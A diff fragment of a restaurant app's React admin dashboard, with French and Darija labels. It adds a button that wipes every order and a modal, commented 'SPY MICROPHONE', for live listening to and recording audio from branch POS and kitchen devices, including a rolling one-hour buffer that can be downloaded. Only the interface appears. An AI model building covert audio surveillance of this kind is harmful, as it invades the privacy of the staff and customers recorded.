+                                                                   {c.deviceType === 'ios' ? <span className="text-[9px] px-1.5 py-0.5 bg-gray-100 text-gray-700 rounded border border-gray-300 font-bold">🍎 iOS</span> : c.deviceType === 'android' ? <span className="text-[9px] px-1.5 py-0.5 bg-green-50 text-green-700 rounded border border-green-200 font-bold">🤖 Android</span> : <span className="text-[9px] px-1.5 py-0.5 bg-blue-50 text-blue-700 rounded border border-blue-200 font-bold">💻 PC</span>}
+                                                               </div>
+                                                               <span className="text-[9px] text-gray-400 mt-1 font-medium">Inscrit le: {c.createdAt?.seconds ? new Date(c.createdAt.seconds * 1000).toLocaleString('fr-FR', {day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}) : '--/--/----'}</span>
                                                            </div>
                                                        </div>
                                                    </td>
@@ -1569,13 +1912,28 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                 )}
 
                     {tab === 'maintenance' && role === 'admin' && (
-                    <AdminMaintenance
-                        db={db}
-                        appId={appId}
-                        showNotify={showNotify}
-                        safeOrders={safeOrders}
-                        clientsList={clientsList}
-                    />
+                    <div className="space-y-6 animate-in fade-in pb-4">
+                        {/* BOUTON HARD RESET */}
+                        <div className="bg-red-50 p-6 md:p-8 rounded-[2rem] border border-red-200 shadow-sm flex flex-col items-center text-center max-w-3xl mx-auto">
+                            <AlertTriangle size={48} className="text-red-500 mb-4 animate-pulse" />
+                            <h2 className="text-2xl font-black text-red-600 mb-2 uppercase">Hard Reset (Formater)</h2>
+                            <p className="text-red-800 font-bold mb-6 text-sm">
+                                Had l-option ghadi tmsse7 <strong>GA3 LES COMMANDES</strong> (historique, en cours, etc.) mn la base de données.<br/>
+                                ✅ <strong>Les comptes Clients w Livreurs ghadi yb9aw (Maghadich ytms7o).</strong>
+                            </p>
+                            <button onClick={handleHardResetOrders} disabled={isFetchingHistory} className="bg-red-600 hover:bg-red-700 text-white px-8 py-4 rounded-xl font-black text-sm uppercase shadow-xl active:scale-95 transition-all flex items-center gap-3 disabled:opacity-50">
+                                <Trash2 size={20}/> {isFetchingHistory ? 'Formatage en cours...' : 'Formater les Commandes'}
+                            </button>
+                        </div>
+                        
+                        <AdminMaintenance
+                            db={db}
+                            appId={appId}
+                            showNotify={showNotify}
+                            safeOrders={safeOrders}
+                            clientsList={clientsList}
+                        />
+                    </div>
                 )}
                 </Suspense>
             </main>
@@ -1597,6 +1955,59 @@ export default function AdminDashboard({ role, managerBranchId, orders, updateSt
                                 confirmDialog.onConfirm();
                                 setConfirmDialog(null);
                             }} className="flex-[2] py-3 font-black text-white bg-green-500 rounded-xl shadow-md active:scale-95 transition-all hover:bg-green-600">Oui, Confirmer</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        )}
+
+        {/* MODAL ÉCOUTE (SPY MICROPHONE) */}
+        {showSpyModal && (
+            <div className="fixed inset-0 z-[5000] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 animate-in zoom-in-95">
+                <div className="bg-[#1e293b] rounded-[2.5rem] w-full max-w-sm flex flex-col overflow-hidden shadow-2xl border border-slate-700">
+                    <div className="p-6 border-b border-slate-700 flex justify-between items-center bg-slate-800">
+                        <h2 className="text-lg font-black text-white flex items-center gap-2"><Mic size={20} className="text-red-500 animate-pulse" /> Écoute en Direct</h2>
+                        <button onClick={() => { stopSpy(); setShowSpyModal(false); }} className="p-2 bg-slate-700 rounded-full hover:bg-slate-600 text-slate-400"><X size={20}/></button>
+                    </div>
+                    <div className="p-6 flex flex-col gap-4">
+                        <div className="flex bg-slate-800 p-1 rounded-xl">
+                            <button onClick={() => setSpyTargetType('pos')} className={`flex-1 py-2.5 rounded-lg font-bold text-xs uppercase transition-all ${spyTargetType === 'pos' ? 'bg-blue-600 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}>Caisse (POS)</button>
+                            <button onClick={() => setSpyTargetType('kds')} className={`flex-1 py-2.5 rounded-lg font-bold text-xs uppercase transition-all ${spyTargetType === 'kds' ? 'bg-orange-600 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}>Cuisine (KDS)</button>
+                        </div>
+                        <div className="flex flex-col gap-3 mb-2">
+                            <select value={spyBranchId} onChange={e => setSpyBranchId(e.target.value)} className="w-full bg-slate-800 border border-slate-700 p-3.5 rounded-xl text-sm font-bold text-white outline-none focus:border-blue-500 shadow-inner">
+                                <option value="" disabled>Sélectionner une agence...</option>
+                                {(settings?.branches || []).map(b => <option key={b.id} value={b.id}>{b.name}</option>)}
+                            </select>
+                            <label className="flex items-center justify-between p-3.5 bg-slate-800 rounded-xl border border-slate-700 cursor-pointer hover:bg-slate-700 transition-colors shadow-inner">
+                                <div className="flex flex-col">
+                                    <span className="text-sm font-bold text-white flex items-center gap-2">🔁 Enregistrement Continu</span>
+                                    <span className="text-[10px] text-slate-400 mt-0.5">Garde la dernière heure (60 min) en mémoire</span>
+                                </div>
+                                <div className={`w-12 h-6 rounded-full relative transition-all border-2 ${isRollingRecordEnabled ? 'bg-blue-600 border-blue-500' : 'bg-slate-600 border-slate-500'}`}>
+                                    <input type="checkbox" className="hidden" checked={isRollingRecordEnabled} onChange={e => setIsRollingRecordEnabled(e.target.checked)} />
+                                    <div className={`absolute top-0.5 w-4 h-4 bg-white rounded-full transition-transform shadow-sm ${isRollingRecordEnabled ? 'translate-x-6' : 'translate-x-1'}`}></div>
+                                </div>
+                            </label>
+                        </div>
+                        <div className="flex flex-col items-center justify-center py-8 bg-slate-900 rounded-2xl border border-slate-800 shadow-inner">
+                            {spyStatus === 'idle' && <MicOff size={48} className="text-slate-600 mb-3" />}
+                            {spyStatus === 'calling' && <div className="w-12 h-12 border-4 border-slate-700 border-t-red-500 rounded-full animate-spin mb-3"></div>}
+                            {spyStatus === 'connected' && <Mic size={48} className="text-red-500 mb-3 animate-pulse" />}
+                            <p className="text-xs font-black text-slate-400 uppercase tracking-widest text-center">
+                                {spyStatus === 'idle' ? 'Prêt à écouter' : spyStatus === 'calling' ? 'Connexion en cours...' : 'En direct'}
+                            </p>
+                            {spyStatus === 'connected' && <p className="text-[10px] text-green-400 mt-2 font-bold uppercase tracking-widest bg-green-500/10 px-3 py-1 rounded-md border border-green-500/20">Audio en cours de lecture</p>}
+                        </div>
+                        <audio ref={audioRef} autoPlay className="hidden"></audio>
+                        <div className="flex flex-col gap-2 mt-2">
+                            {spyStatus === 'idle' ? (<button onClick={startSpy} disabled={!spyBranchId} className="w-full bg-green-600 hover:bg-green-500 text-white py-4 rounded-xl font-black text-sm uppercase shadow-lg active:scale-95 transition-all disabled:opacity-50 flex items-center justify-center gap-2"><Mic size={18}/> Lancer l'écoute</button>) : (<button onClick={stopSpy} className="w-full bg-slate-700 hover:bg-slate-600 text-white py-4 rounded-xl font-black text-sm uppercase shadow-lg active:scale-95 transition-all border border-slate-600">Arrêter l'écoute</button>)}
+                            {spyStatus === 'connected' && (!isRecording ? (<button onClick={startRecording} className="w-full bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 py-3 rounded-xl font-black text-xs uppercase transition-all flex items-center justify-center gap-2 mt-2">🔴 Démarrer Enregistrement</button>) : (<button onClick={stopRecording} className="w-full bg-red-600 hover:bg-red-500 text-white shadow-[0_0_20px_rgba(220,38,38,0.4)] py-3 rounded-xl font-black text-xs uppercase transition-all flex items-center justify-center gap-2 animate-pulse mt-2">⏹️ Arrêter et Sauvegarder</button>))}
+                            {spyStatus === 'connected' && isRollingRecordEnabled && (
+                                <button onClick={downloadLastHour} className="w-full bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 border border-blue-500/30 py-3 rounded-xl font-black text-xs uppercase transition-all flex items-center justify-center gap-2 mt-2" title="Sauvegarder la dernière heure">
+                                    ⏪ Télécharger la dernière heure
+                                </button>
+                            )}
                         </div>
                     </div>
                 </div>
